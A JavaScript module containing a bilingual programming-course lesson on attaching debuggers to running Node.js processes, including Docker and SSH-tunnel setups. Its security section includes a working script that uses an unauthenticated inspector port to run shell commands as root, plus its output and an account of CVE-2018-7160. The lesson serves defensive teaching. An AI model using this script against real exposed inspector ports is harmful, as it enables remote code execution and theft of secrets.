/**
 * 3.4 — Gắn vào tiến trình đang chạy: --inspect, SIGUSR1, Docker, an toàn cổng 9229 (soạn 24/11/2026).
 * Output chạy THẬT trên Linux · Node v22.22.2 (máy) · node:22-alpine (container dbg-node, chỉ bind 127.0.0.1, đã xoá sau khi chạy).
 * Góc hacker chạy THẬT trên container của chính mình: Runtime.evaluate qua cổng inspector ⇒ execSync('id') ra uid=0(root).
 * Sự cố có nguồn: CVE-2018-7160 (DNS rebinding vào inspector, sửa trong bản bảo mật Node tháng 3/2018: 6.14.0, 8.11.0, 9.10.0).
 * Mã: scratchpad/dbg/lab/ch3/3-4 + tools/ke-xau.mjs.
 */
import { nguon, lienKet } from '../_chung.mjs';

const OUT_USR1 = `<div class="out">$ node dist/app.js &amp;                     # started WITHOUT --inspect (like most production-style runs)
LabFlow API: http://127.0.0.1:43000
$ ss -ltn | grep -cE ':(9229|49229)\\b'
0                                         ← no inspector port open
$ kill -USR1 1633788                      # the PID of that node process
Debugger listening on ws://127.0.0.1:9229/55248f23-382b-4f13-ad22-f6d99c0e17e6
For help, see: https://nodejs.org/en/docs/inspector
$ ss -ltnp | grep 'pid=1633788,'
LISTEN 0  511  127.0.0.1:43000  0.0.0.0:*  users:(("node",pid=1633788,fd=22))
LISTEN 0  511  127.0.0.1:9229   0.0.0.0:*  users:(("node",pid=1633788,fd=34))</div>`;

const MA_SERVER = `<pre><code class="language-js">// ~/dbg-lab/ch3/3-4/server.js — room price per hour, running inside a container
const http = require('http');

const BANG_GIA = { thuong: 50000, cuoiTuan: 80000 };   // per hour

function tinhTien(gio, loai) {
  return gio * BANG_GIA[loai];
}

http.createServer((req, res) =&gt; {
  const u = new URL(req.url, 'http://x');
  const tien = tinhTien(Number(u.searchParams.get('gio')), u.searchParams.get('loai'));
  res.end(JSON.stringify({ tien }) + '\\n');
}).listen(3000, '0.0.0.0', () =&gt; console.log('gia-phong :3000'));</code></pre>`;

const OUT_DOCKER = `<div class="out">$ docker run -d --name dbg-node -v ~/dbg-lab/ch3/3-4:/app:ro -w /app \\
    -p 127.0.0.1:43001:3000 -p 127.0.0.1:49230:9229 \\
    node:22-alpine node --inspect=0.0.0.0:9229 server.js
$ docker logs dbg-node
Debugger listening on ws://0.0.0.0:9229/daf3e700-42de-4fd3-9ac4-0eedff651de2
gia-phong :3000
$ curl -s '127.0.0.1:43001/?gio=3&amp;loai=thuong'
{"tien":150000}
$ curl -s '127.0.0.1:43001/?gio=3&amp;loai=cuoi-tuan'
{"tien":null}                              ← weekend price is null?
$ curl -s 127.0.0.1:49230/json/list | grep '"url"'
  "url": "file:///app/server.js",           ← the path INSIDE the container
$ docker port dbg-node
3000/tcp -&gt; 127.0.0.1:43001
9229/tcp -&gt; 127.0.0.1:49230</div>`;

const OUT_ATTACH = `<div class="out">$ node inspect 127.0.0.1:49230
connecting to 127.0.0.1:49230 ... ok
debug&gt; sb('server.js', 6)
debug&gt;                                     # meanwhile: curl -s '127.0.0.1:43001/?gio=3&amp;loai=cuoi-tuan'
break in /app/server.js:6
  4
  5 function tinhTien(gio, loai) {
&gt; 6   return gio * BANG_GIA[loai];
  7 }
debug&gt; exec loai
'cuoi-tuan'
debug&gt; exec Object.keys(BANG_GIA)
[ 'thuong', 'cuoiTuan' ]
debug&gt; exec BANG_GIA[loai]
undefined</div>`;

const LAUNCH_DOCKER = `<pre><code class="language-json">{
  "name": "Attach: container dbg-node",
  "type": "node",
  "request": "attach",
  "address": "127.0.0.1",
  "port": 49230,
  "localRoot": "\${workspaceFolder}/ch3/3-4",   // where the file is on YOUR disk
  "remoteRoot": "/app",                          // where the same file is inside the container
  "restart": true
}</code></pre>`;

const OUT_KEXAU = `<div class="out">$ node ke-xau.mjs 49230        # 12 lines: /json/list → WebSocket → Runtime.evaluate. No password asked.
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
a4d085267725
NAME="Alpine Linux"
$ docker logs dbg-node | tail -2
Debugger attached.                         ← the only trace the attack left</div>`;

const MA_KEXAU = `<pre><code class="language-js">// ke-xau.mjs — what ANYONE who can reach an inspector port can do (run only against your own container)
const port = process.argv[2];
const [t] = await (await fetch(\`http://127.0.0.1:\${port}/json/list\`)).json();
const ws = new WebSocket(t.webSocketDebuggerUrl);
await new Promise((r) =&gt; ws.addEventListener('open', r));
ws.send(JSON.stringify({ id: 1, method: 'Runtime.evaluate', params: {
  expression: "process.mainModule.require('child_process').execSync('id; hostname; cat /etc/os-release | head -1').toString()",
  returnByValue: true } }));
ws.addEventListener('message', (e) =&gt; { const m = JSON.parse(e.data); if (m.id === 1) { console.log(m.result.result.value); ws.close(); } });</code></pre>`;

const NGUON = [
  nguon('🟢', 'Node.js — Debugging guide: Security implications', 'Cổng inspector cho toàn quyền thực thi; không bind IP công khai; dùng SSH tunnel.', 'https://nodejs.org/en/learn/getting-started/debugging#security-implications'),
  nguon('🛡️', 'Node.js — March 2018 security releases (CVE-2018-7160)', 'DNS rebinding: trang web độc hại gắn được vào inspector trên máy lập trình viên; bản sửa kiểm Host header.', 'https://nodejs.org/en/blog/vulnerability/march-2018-security-releases/'),
  nguon('📋', 'NVD — CVE-2018-7160', 'CVSS v3 8.8; sửa ở Node 6.14.0, 8.11.0, 9.10.0.', 'https://nvd.nist.gov/vuln/detail/CVE-2018-7160'),
  nguon('🟦', 'VS Code — Remote debugging / attach (localRoot, remoteRoot)', 'Ánh xạ đường dẫn khi code chạy ở máy khác hoặc trong container.', 'https://code.visualstudio.com/docs/nodejs/nodejs-debugging#_remote-debugging'),
  lienKet({ khoa: 'docker', bai: 'dk-13-2-hot-reload-debug', title: 'Docker 13.2 — hot reload và debugger trong container', sub: 'Compose, volume và nodemon trong container; bài này chỉ phần attach + bảo mật.', cta: 'Mở bài →' }),
].join('\n');

export default {
  title: '3.4 — Attaching to a running process: --inspect, --inspect-brk and Docker|||3.4 — Gắn vào tiến trình đang chạy: --inspect, --inspect-brk và Docker',
  slug: 'dbg-3-4-attach',
  type: 'LESSON',
  isFreePreview: true,
  description: 'Bật inspector cho tiến trình đang chạy mà không khởi động lại (kill -USR1, "Attach to Node Process"); attach vào Node trong container Docker (chỉ publish 127.0.0.1, localRoot/remoteRoot vì đường dẫn trong container là /app); bắt lỗi giá cuối tuần trả null. Góc hacker chạy thật: ai với tới cổng inspector là chạy được lệnh tuỳ ý (uid=0(root)), CVE-2018-7160 (DNS rebinding, 2018); cách phòng: 127.0.0.1, SSH tunnel, không bao giờ mở 9229 ra mạng.',
  content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Lesson 3.4</span>
<h2>The bug only shows after the app has been running a while — attach, don't restart</h2>
<p class="lead">Some bugs disappear when you restart: a cache that filled up wrongly, a connection pool in a bad state, data that arrived an hour ago. Restarting with F5 destroys the evidence. This lesson shows three ways to attach to a process that is already running — on your machine, by PID, and inside a Docker container — and then shows, by actually doing it, why an inspector port is one of the most dangerous ports you can leave open.</p>

<h3>An everyday picture: the mechanic and the running engine</h3>
<p>Some engine noises only happen when the engine is hot. A good mechanic does not switch it off to "have a look"; he puts the stethoscope on while it runs. Attach is the stethoscope. The danger: a stethoscope hole in the engine cover is also a hole anyone can reach into.</p>

<h3>1. Turn the inspector on in a process that did not start with --inspect</h3>
<p>On Linux and macOS, Node listens for the signal <code>SIGUSR1</code>: when it arrives, Node opens the inspector on 127.0.0.1:9229 — no restart, state kept.</p>
${OUT_USR1}
<p>VS Code's <em>Attach to Node Process</em> (Command Palette, or a configuration with <code>"processId": "\${command:PickProcess}"</code>) does exactly this for you: lists node processes, sends the signal, attaches. On Windows there is no SIGUSR1; VS Code uses another mechanism, or start the process with <code>--inspect</code>. Note the port is the default 9229 — if another process already holds it, opening fails; that is the "address already in use" you met in lesson 3.1.</p>

<h3>2. Attach to Node inside a container</h3>
${MA_SERVER}
<p>Run it in a container with the inspector listening on <code>0.0.0.0</code> <em>inside</em> the container (otherwise Docker cannot forward to it), but publish the port only on the host's <code>127.0.0.1</code>:</p>
${OUT_DOCKER}
<p>The weekend price is <code>null</code> (JSON prints <code>NaN</code> as <code>null</code>). Attach and look:</p>
${OUT_ATTACH}
<p>The front-end sends <code>cuoi-tuan</code> (kebab-case), the table uses <code>cuoiTuan</code> (camelCase): <code>undefined × 3 = NaN</code>. A contract mismatch between two teams — and a missing "unknown price type ⇒ 400" check. Notice the path in the debugger: <code>/app/server.js</code>, not your local path. VS Code needs to be told how the two map:</p>
${LAUNCH_DOCKER}
<p>Without <code>localRoot</code>/<code>remoteRoot</code>, breakpoints you set in your editor never bind, because VS Code asks for a file named <code>~/dbg-lab/…/server.js</code> that does not exist in the container. The same mapping is needed for a remote test server. For the Compose setup with hot reload (volumes + nodemon inside the container), see Docker 13.2 linked below.</p>

<h3>3. A remote machine: the SSH tunnel</h3>
<p>The test server runs <code>node --inspect=127.0.0.1:9229 app.js</code> — reachable only from that machine. From your laptop: <code>ssh -L 9229:127.0.0.1:9229 you@test-server</code>. While that SSH session is open, <code>127.0.0.1:9229</code> on <em>your</em> machine is a tunnel to the server's 127.0.0.1:9229, encrypted and authenticated by SSH. Attach to localhost:9229 as usual, with <code>remoteRoot</code> set to the deploy path. Never "solve" it by binding the inspector to <code>0.0.0.0</code> on the server.</p>

<h3>🕵️ Hacker's corner — an open inspector port is remote code execution</h3>
<p>The inspector has <strong>no password</strong>. Whoever can open a WebSocket to it can evaluate any JavaScript inside your process — including spawning shell commands. Not a theory; this was run against the lab container above:</p>
${MA_KEXAU}
${OUT_KEXAU}
<p>Twelve lines, root inside the container, and the only trace is "Debugger attached." in a log nobody reads. From there an attacker reads <code>process.env</code> (database passwords, API keys), the mounted source code, and anything the container can reach on the network.</p>
<p><strong>Real incident: CVE-2018-7160 (Node.js, March 2018).</strong> Even an inspector bound to localhost was reachable: while a developer had a debug session open and visited a malicious website, the site used <em>DNS rebinding</em> — its domain first resolves to the attacker's server, then to 127.0.0.1 — so the victim's own browser talked to the inspector and gave the site full code execution. Node fixed it in 6.14.0, 8.11.0 and 9.10.0 by checking the <code>Host</code> header (only <code>localhost</code>/<code>localhost6</code> or a raw IP are accepted). NVD rates it 8.8/10.</p>
<p><strong>How to protect yourself — checklist you can do today:</strong></p>
<ol>
<li>Always write the host: <code>--inspect=127.0.0.1:9229</code>, and in Docker <code>-p 127.0.0.1:9229:9229</code>, never <code>-p 9229:9229</code> (that publishes on all interfaces, and Docker's port rules bypass many host firewalls).</li>
<li>Never ship <code>--inspect</code> in a production Dockerfile, PM2 config or <code>npm start</code>. Grep for it in code review.</li>
<li>Remote debugging = SSH tunnel; the port stays on the server's loopback.</li>
<li>Keep Node updated (security releases fix inspector issues like the one above).</li>
<li>The same rule holds for Java: JDWP port 5005 is equally "run anything" (lesson 4.5).</li>
</ol>

<h3>On the job</h3>
<p>Staging shows wrong prices only after a few hours; restarting "fixes" it until next day. Ask the DevOps/lead for permission first (attaching pauses the process when you hit a breakpoint — for everyone using staging). Then: SSH tunnel, attach with a <em>logpoint</em> instead of a breakpoint so nothing stops, collect the values, detach. Write in the ticket what you attached to and when, so nobody is surprised by "Debugger attached" in the logs.</p>

<h3>🧪 Practice (25 min)</h3>
<div class="callout ok">
<ol>
<li>Start LabFlow without <code>--inspect</code>. Use VS Code's <em>Attach to Node Process</em> (or <code>kill -USR1</code> + attach to 9229). Pause in a route, then Disconnect — confirm the API still answers.</li>
<li>Run <code>server.js</code> in the container as above. Attach from VS Code with <code>localRoot</code>/<code>remoteRoot</code>, set the breakpoint <em>in your editor</em>, find the weekend bug. Then remove <code>remoteRoot</code> and observe the breakpoint stay unbound.</li>
<li>Fix: accept only known types, return 400 with a clear message otherwise. Add the test.</li>
<li>Run <code>ke-xau.mjs</code> against <em>your own</em> container, then restart the container with <code>-p 9229:9229</code> and check with <code>docker port</code> what changed. Remove it afterwards: <code>docker rm -f dbg-node</code>.</li>
</ol>
<p><strong>Done when:</strong> you attached to a running process without restarting it, a breakpoint set in your editor bound inside the container, and you can explain to a classmate in two sentences why 9229 must never be public.</p>
</div>

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">SIGUSR1</span><span class="v">Signal that makes a running Node process open its inspector.</span></div>
  <div class="kv"><span class="k">localRoot / remoteRoot</span><span class="v">The same folder on your disk / on the remote or container.</span></div>
  <div class="kv"><span class="k">port publishing</span><span class="v">Docker -p host:container; always give the host IP 127.0.0.1.</span></div>
  <div class="kv"><span class="k">SSH tunnel (-L)</span><span class="v">Forwards a local port to a port on the server's loopback, encrypted.</span></div>
  <div class="kv"><span class="k">RCE</span><span class="v">Remote code execution — what an exposed inspector gives away.</span></div>
  <div class="kv"><span class="k">DNS rebinding</span><span class="v">Making a browser treat 127.0.0.1 as the attacker's site.</span></div>
</div>

<h3>📌 Summary</h3>
<ul>
<li>Attach keeps the state that a restart would destroy.</li>
<li>SIGUSR1 / "Attach to Node Process" turn the inspector on without restarting.</li>
<li>In containers: inspector on 0.0.0.0 inside, publish on 127.0.0.1 outside, map remoteRoot.</li>
<li>Remote machines: SSH tunnel, never a public inspector.</li>
<li>Inspector access = run any code as that process (shown live; CVE-2018-7160).</li>
</ul>
${NGUON}
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 3 · Bài 3.4</span>
<h2>Lỗi chỉ hiện sau khi ứng dụng chạy một lúc — gắn vào, đừng khởi động lại</h2>
<p class="lead">Có những lỗi biến mất khi khởi động lại: một bộ đệm bị đổ dữ liệu sai, một pool kết nối ở trạng thái hỏng, dữ liệu tới từ một tiếng trước. Khởi động lại bằng F5 là xoá luôn bằng chứng. Bài này chỉ ba cách gắn vào tiến trình đang chạy — trên máy bạn, theo PID, và trong container Docker — rồi cho thấy, bằng cách làm thật, vì sao cổng inspector là một trong những cổng nguy hiểm nhất mà bạn có thể để mở.</p>

<h3>Liên tưởng đời thường: thợ máy và động cơ đang nổ</h3>
<p>Có những tiếng kêu chỉ xuất hiện khi máy nóng. Thợ giỏi không tắt máy để "xem thử"; anh ta áp ống nghe vào khi máy đang chạy. Attach là cái ống nghe. Mối nguy: lỗ để áp ống nghe trên nắp máy cũng là lỗ mà bất kỳ ai cũng thò tay vào được.</p>

<h3>1. Bật inspector cho tiến trình không chạy với --inspect</h3>
<p>Trên Linux và macOS, Node lắng nghe tín hiệu <code>SIGUSR1</code>: khi nhận được, Node mở inspector ở 127.0.0.1:9229 — không khởi động lại, trạng thái giữ nguyên.</p>
${OUT_USR1}
<p><em>Attach to Node Process</em> của VS Code (Command Palette, hoặc cấu hình có <code>"processId": "\${command:PickProcess}"</code>) làm đúng việc đó giúp bạn: liệt kê tiến trình node, gửi tín hiệu, gắn vào. Windows không có SIGUSR1; VS Code dùng cơ chế khác, hoặc bạn chạy tiến trình với <code>--inspect</code>. Để ý cổng là 9229 mặc định — nếu tiến trình khác đang giữ nó thì mở thất bại; đó là lỗi "address already in use" bạn đã gặp ở bài 3.1.</p>

<h3>2. Gắn vào Node trong container</h3>
${MA_SERVER}
<p>Chạy nó trong container với inspector nghe trên <code>0.0.0.0</code> <em>bên trong</em> container (không thì Docker không chuyển tiếp vào được), nhưng chỉ publish cổng trên <code>127.0.0.1</code> của máy chủ:</p>
${OUT_DOCKER}
<p>Giá cuối tuần là <code>null</code> (JSON in <code>NaN</code> thành <code>null</code>). Gắn vào và nhìn:</p>
${OUT_ATTACH}
<p>Giao diện gửi <code>cuoi-tuan</code> (kiểu gạch nối), bảng giá dùng <code>cuoiTuan</code> (kiểu camelCase): <code>undefined × 3 = NaN</code>. Lệch hợp đồng giữa hai nhóm — và thiếu bước kiểm "loại giá lạ ⇒ 400". Để ý đường dẫn trong debugger: <code>/app/server.js</code>, không phải đường dẫn trên máy bạn. Phải nói cho VS Code biết hai cái ánh xạ thế nào:</p>
${LAUNCH_DOCKER}
<p>Thiếu <code>localRoot</code>/<code>remoteRoot</code>, breakpoint đặt trong editor không bao giờ gắn được, vì VS Code hỏi một tệp tên <code>~/dbg-lab/…/server.js</code> vốn không có trong container. Ánh xạ y hệt cần cho máy test từ xa. Phần Compose có hot reload (volume + nodemon trong container) xem Docker 13.2 ở liên kết bên dưới.</p>

<h3>3. Máy ở xa: đường hầm SSH</h3>
<p>Máy test chạy <code>node --inspect=127.0.0.1:9229 app.js</code> — chỉ với tới được từ chính máy đó. Từ laptop: <code>ssh -L 9229:127.0.0.1:9229 ban@may-test</code>. Khi phiên SSH còn mở, <code>127.0.0.1:9229</code> trên máy <em>bạn</em> là đường hầm tới 127.0.0.1:9229 của server, được SSH mã hoá và xác thực. Attach vào localhost:9229 như thường, đặt <code>remoteRoot</code> là thư mục deploy. Đừng bao giờ "giải quyết" bằng cách cho inspector nghe <code>0.0.0.0</code> trên server.</p>

<h3>🕵️ Góc hacker — cổng inspector mở = chạy mã từ xa</h3>
<p>Inspector <strong>không có mật khẩu</strong>. Ai mở được WebSocket tới nó là chạy được JavaScript tuỳ ý trong tiến trình của bạn — kể cả gọi lệnh shell. Không phải lý thuyết; đoạn này đã chạy thật vào container lab ở trên:</p>
${MA_KEXAU}
${OUT_KEXAU}
<p>Mười hai dòng, quyền root trong container, và dấu vết duy nhất là "Debugger attached." trong một log không ai đọc. Từ đó kẻ tấn công đọc <code>process.env</code> (mật khẩu cơ sở dữ liệu, khoá API), mã nguồn được mount, và mọi thứ container với tới được trên mạng.</p>
<p><strong>Sự cố thật: CVE-2018-7160 (Node.js, tháng 3/2018).</strong> Ngay cả inspector chỉ nghe localhost cũng bị với tới: khi lập trình viên đang mở phiên debug và vào một trang web độc hại, trang đó dùng <em>DNS rebinding</em> — tên miền của nó lúc đầu trỏ về server kẻ tấn công, sau đó trỏ về 127.0.0.1 — nên chính trình duyệt của nạn nhân nói chuyện với inspector và trao cho trang đó toàn quyền chạy mã. Node sửa ở 6.14.0, 8.11.0 và 9.10.0 bằng cách kiểm header <code>Host</code> (chỉ nhận <code>localhost</code>/<code>localhost6</code> hoặc IP trần). NVD chấm 8,8/10.</p>
<p><strong>Cách phòng — danh sách làm được ngay hôm nay:</strong></p>
<ol>
<li>Luôn ghi rõ host: <code>--inspect=127.0.0.1:9229</code>, và trong Docker <code>-p 127.0.0.1:9229:9229</code>, không bao giờ <code>-p 9229:9229</code> (cái đó publish trên mọi giao diện mạng, và luật cổng của Docker đi vòng qua nhiều tường lửa máy chủ).</li>
<li>Không bao giờ để <code>--inspect</code> trong Dockerfile production, cấu hình PM2 hay <code>npm start</code>. Tìm chữ này khi review code.</li>
<li>Debug từ xa = đường hầm SSH; cổng ở yên trên loopback của server.</li>
<li>Cập nhật Node (bản bảo mật sửa những lỗi inspector như trên).</li>
<li>Java cũng y hệt: cổng JDWP 5005 cũng "chạy gì cũng được" (bài 4.5).</li>
</ol>

<h3>Tình huống đi làm</h3>
<p>Staging báo giá sai chỉ sau vài giờ; khởi động lại thì "hết" tới hôm sau. Xin phép DevOps/trưởng nhóm trước (gắn vào mà chạm breakpoint là dừng tiến trình — với mọi người đang dùng staging). Rồi: đường hầm SSH, gắn vào và dùng <em>logpoint</em> thay vì breakpoint để không có gì dừng, thu giá trị, ngắt ra. Ghi vào ticket bạn đã gắn vào cái gì, lúc nào, để không ai giật mình khi thấy "Debugger attached" trong log.</p>

<h3>🧪 Thực hành (25 phút)</h3>
<div class="callout ok">
<ol>
<li>Chạy LabFlow không có <code>--inspect</code>. Dùng <em>Attach to Node Process</em> của VS Code (hoặc <code>kill -USR1</code> + attach vào 9229). Dừng trong một route, rồi Disconnect — xác nhận API vẫn trả lời.</li>
<li>Chạy <code>server.js</code> trong container như trên. Attach từ VS Code có <code>localRoot</code>/<code>remoteRoot</code>, đặt breakpoint <em>trong editor</em>, tìm lỗi giá cuối tuần. Rồi bỏ <code>remoteRoot</code> và quan sát breakpoint không gắn được.</li>
<li>Sửa: chỉ nhận các loại đã biết, loại lạ trả 400 với thông báo rõ. Thêm test.</li>
<li>Chạy <code>ke-xau.mjs</code> vào container <em>của chính bạn</em>, rồi chạy lại container với <code>-p 9229:9229</code> và xem bằng <code>docker port</code> có gì đổi. Xoá khi xong: <code>docker rm -f dbg-node</code>.</li>
</ol>
<p><strong>Đạt khi:</strong> bạn gắn được vào tiến trình đang chạy mà không khởi động lại, breakpoint đặt trong editor gắn được vào code trong container, và giải thích được cho bạn cùng lớp trong hai câu vì sao 9229 không bao giờ được công khai.</p>
</div>

<h3>🗂 Thuật ngữ trong bài</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">SIGUSR1</span><span class="v">Tín hiệu khiến tiến trình Node đang chạy mở inspector.</span></div>
  <div class="kv"><span class="k">localRoot / remoteRoot</span><span class="v">Cùng một thư mục, trên đĩa của bạn / trên máy xa hoặc container.</span></div>
  <div class="kv"><span class="k">port publishing</span><span class="v">Docker -p host:container; luôn ghi IP máy chủ 127.0.0.1.</span></div>
  <div class="kv"><span class="k">SSH tunnel (-L)</span><span class="v">Chuyển một cổng ở máy mình tới cổng trên loopback của server, có mã hoá.</span></div>
  <div class="kv"><span class="k">RCE</span><span class="v">Remote code execution — chạy mã từ xa, thứ một inspector bị lộ trao đi.</span></div>
  <div class="kv"><span class="k">DNS rebinding</span><span class="v">Lừa trình duyệt coi 127.0.0.1 là trang của kẻ tấn công.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul>
<li>Attach giữ lại trạng thái mà khởi động lại sẽ xoá mất.</li>
<li>SIGUSR1 / "Attach to Node Process" bật inspector mà không khởi động lại.</li>
<li>Trong container: inspector nghe 0.0.0.0 bên trong, publish 127.0.0.1 bên ngoài, ánh xạ remoteRoot.</li>
<li>Máy ở xa: đường hầm SSH, không bao giờ để inspector công khai.</li>
<li>Với tới inspector = chạy mã tuỳ ý dưới quyền tiến trình đó (đã chạy thật; CVE-2018-7160).</li>
</ul>
${NGUON}
</div>
`,
};
